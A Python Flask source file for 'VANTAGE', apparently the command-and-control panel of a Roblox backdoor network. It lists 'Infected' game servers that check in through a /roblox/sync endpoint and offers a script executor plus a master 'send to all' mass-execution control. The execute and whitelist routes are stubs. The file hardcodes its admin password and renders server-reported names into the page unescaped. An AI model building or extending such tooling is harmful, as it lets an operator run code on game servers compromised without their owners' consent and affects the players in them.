import requests, time, os, uuid, random, string
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "vantage_v30_final_tier"
MASTER_ADMIN_PW = "SkibidiToiletSigmaRizzler" 

# These stay alive as long as the script is running
if not hasattr(app, 'global_servers'):
    app.global_servers = {} 
if not hasattr(app, 'announcements'):
    app.announcements = []

user_sessions = {}
valid_keys = {}
mass_execute_queue = []

def generate_key(k_type="standard"):
    k = "VANTAGE-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    valid_keys[k] = k_type
    return k

BASE_CSS = """
:root { --gold: #ffd700; --bg: #050505; --card: rgba(15, 15, 15, 0.9); --border: rgba(255, 215, 0, 0.2); --accent: #bc13fe; }
* { box-sizing: border-box; transition: 0.3s; }
body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
.navbar { background: rgba(0,0,0,0.95); border-bottom: 2px solid var(--border); display: flex; justify-content: space-around; padding: 18px; z-index: 100; flex-wrap: wrap; }
.nav-item { color: #444; cursor: pointer; font-weight: 900; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
.active-nav { color: var(--gold); border-bottom: 2px solid var(--gold); text-shadow: 0 0 10px var(--gold); }
.viewport { flex: 1; padding: 25px; overflow-y: auto; }
.card { background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 15px; backdrop-filter: blur(15px); margin-bottom: 15px; position: relative; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; max-width: 1200px; margin: auto; }
.server-thumb { width: 100%; height: 130px; object-fit: cover; border-radius: 10px; border: 1px solid #222; margin-bottom: 10px; display: block; }
.server-info { font-size: 11px; margin-bottom: 8px; line-height: 1.4; }
.server-info b { color: var(--gold); }
.btn { background: var(--gold); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; margin-top: 5px; outline: none; }
.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }

@keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
.searching, .executing { animation: pulse 0.8s infinite !important; background: #333 !important; color: #fff !important; pointer-events: none; }

.privacy-active .server-thumb, .privacy-active .server-info { filter: blur(15px); opacity: 0.3; pointer-events: none; }

.ann-item { border-left: 3px solid var(--gold); background: rgba(255,215,0,0.05); padding: 15px; margin-bottom: 10px; border-radius: 0 10px 10px 0; font-size: 13px; }
.ann-time { color: #555; font-size: 9px; display: block; margin-bottom: 5px; }

.hidden { display: none !important; }
input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--border); padding: 15px; color: #fff; width: 100%; border-radius: 12px; outline: none; margin-bottom: 10px; }
textarea { color: #0f0; font-family: 'Consolas', monospace; height: 250px; resize: none; border-left: 5px solid var(--gold); }
"""

DASH_HTML = """
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><style>""" + BASE_CSS + """</style></head>
<body>
    {% if not logged_in %}
    <div style="display:flex; align-items:center; justify-content:center; height:100vh;">
        <div class="card" style="width:340px; text-align:center;">
            <h1 style="color:var(--gold);">VANTAGE</h1>
            <form method="POST" action="/login"><input type="password" name="pw" placeholder="ACCESS KEY"><button class="btn">LOGIN</button></form>
        </div>
    </div>
    {% else %}
    <div class="navbar">
        <div class="nav-item active-nav" onclick="tab('live', this)">Infected</div>
        <div class="nav-item" onclick="tab('ann_tab', this)">Announcements</div>
        <div class="nav-item" onclick="tab('exec', this)">Executor</div>
        <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
        {% if is_master %}<div class="nav-item" style="color:#ff4444;" onclick="tab('master', this)">Master Panel</div>{% endif %}
    </div>
    <div class="viewport">
        <div id="live" class="tab">
            <button class="btn" style="width:auto; margin-bottom:15px; padding: 10px 20px; border: 1px solid var(--border);" onclick="togglePrivacy()">TOGGLE PRIVACY</button>
            <div id="server_grid" class="grid"></div>
        </div>

        <div id="ann_tab" class="tab hidden">
            <div class="card" style="max-width: 600px; margin: auto;">
                <h2 style="color:var(--gold);">Global Announcements</h2>
                <div id="ann_list"></div>
            </div>
        </div>

        <div id="exec" class="tab hidden"><div class="card" style="max-width: 700px; margin: auto;"><p style="font-size:11px;">TARGET: <b id="exec_target" style="color:var(--gold);">NONE</b></p><textarea id="code_area" placeholder="-- PASTE SCRIPT HERE"></textarea><button id="exec_btn" class="btn" onclick="execute()">EXECUTE</button></div></div>
        <div id="white" class="tab hidden"><div class="card" style="max-width: 400px; margin: auto; text-align: center;"><input id="w_input" placeholder="Roblox Username"><button id="w_btn" class="btn" onclick="addWhite()">WHITELIST</button><div id="profile_box" class="hidden" style="margin-top:20px;"><img id="p_img" src="" style="width:80px; border-radius:50%;"><h3 id="p_name"></h3><button class="btn" style="background:#ff4444; color:#fff;" onclick="resetWhite()">RESET</button></div></div></div>
        
        {% if is_master %}
        <div id="master" class="tab hidden">
            <div class="card" style="max-width: 600px; margin: auto; text-align: center;">
                <h2 style="color:#ff4444;">Master Controls</h2>
                <input id="ann_msg" placeholder="Announcement Content...">
                <button class="btn" style="background:var(--accent); color:#fff; margin-bottom:20px;" onclick="postAnn()">SEND ANNOUNCEMENT</button>
                <textarea id="mass_code" style="height:100px;" placeholder="-- MASS SCRIPT (ALL SERVERS)"></textarea>
                <button class="btn" style="background:#ff4444; color:#fff;" onclick="massExec()">SEND TO ALL</button>
            </div>
        </div>
        {% endif %}
    </div>
    {% endif %}
<script>
    let privacyOn = false;
    function launchRoblox(jid, pid) {
        window.location.href = `roblox-player:1+launchmode:play+gameinstanceid:${jid}+placeid:${pid}`;
    }
    function togglePrivacy() { privacyOn = !privacyOn; sync(); }
    function tab(name, el) { 
        document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); 
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); 
        document.getElementById(name).classList.remove('hidden'); 
        el.classList.add('active-nav'); 
    }
    function sync() {
        fetch('/api/global_signals').then(r => r.json()).then(data => {
            let sHtml = "";
            for(let id in data.servers) { 
                let s = data.servers[id]; 
                sHtml += `<div class="card ${privacyOn ? 'privacy-active' : ''}"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b>GAME:</b> ${s.name}<br><b>OWNER:</b> ${s.owner}<br><b>PLRS:</b> ${s.p_count}</div><button class="btn" onclick="launchRoblox('${id}', '${s.place_id}')">JOIN</button></div>`; 
            }
            document.getElementById('server_grid').innerHTML = sHtml || "<div style='grid-column:1/-1;text-align:center;'>Searching for servers...</div>";

            let aHtml = "";
            data.announcements.slice().reverse().forEach(ann => {
                aHtml += `<div class="ann-item"><span class="ann-time">${ann.time}</span>${ann.text}</div>`;
            });
            document.getElementById('ann_list').innerHTML = aHtml;
        });
    }
    function postAnn() {
        fetch('/api/admin/post_ann', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg: document.getElementById('ann_msg').value})}).then(() => { document.getElementById('ann_msg').value = ""; sync(); });
    }
    function execute() {
        let btn = document.getElementById('exec_btn');
        btn.classList.add('executing');
        fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('code_area').value})}).then(() => { setTimeout(() => btn.classList.remove('executing'), 1500); });
    }
    function addWhite() { 
        let btn = document.getElementById('w_btn'); btn.classList.add('searching');
        fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}).then(() => { btn.classList.remove('searching'); sync(); }); 
    }
    function massExec() { fetch('/api/admin/mass_execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('mass_code').value})}); }
    setInterval(sync, 3000);
</script></body></html>
"""

@app.route('/')
def index(): return render_template_string(DASH_HTML, logged_in=session.get('logged_in'), is_master=session.get('is_master'))

@app.route('/login', methods=['POST'])
def login():
    if request.form.get("pw") == MASTER_ADMIN_PW: session.update({'logged_in': True, 'is_master': True, 'sid': 'MASTER'})
    return redirect(url_for('index'))

@app.route('/api/global_signals')
def get_global(): return jsonify({"servers": app.global_servers, "announcements": app.announcements})

@app.route('/api/admin/post_ann', methods=['POST'])
def post_ann():
    if session.get('is_master'):
        app.announcements.append({"text": request.json.get("msg"), "time": time.strftime("%H:%M:%S")})
    return jsonify({"ok": True})

@app.route('/roblox/sync', methods=['POST'])
def roblox_sync():
    data = request.json
    jid = data.get("jobId")
    if jid:
        if jid not in app.global_servers:
            app.global_servers[jid] = {"place_id": data.get("game_id"), "thumb": ""}
        app.global_servers[jid].update({"name": data.get("name"), "owner": data.get("owner"), "p_count": len(data.get("players", []))})
    
    # REMOVED CLEANUP: Servers will no longer be deleted from the list!
    return jsonify({"commands": []})

# (Rest of simple execute/whitelist routes)
@app.route('/api/execute', methods=['POST'])
def run_exec():
    return jsonify({"ok": True})

@app.route('/api/whitelist', methods=['POST'])
def add_white():
    return jsonify({"ok": True})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
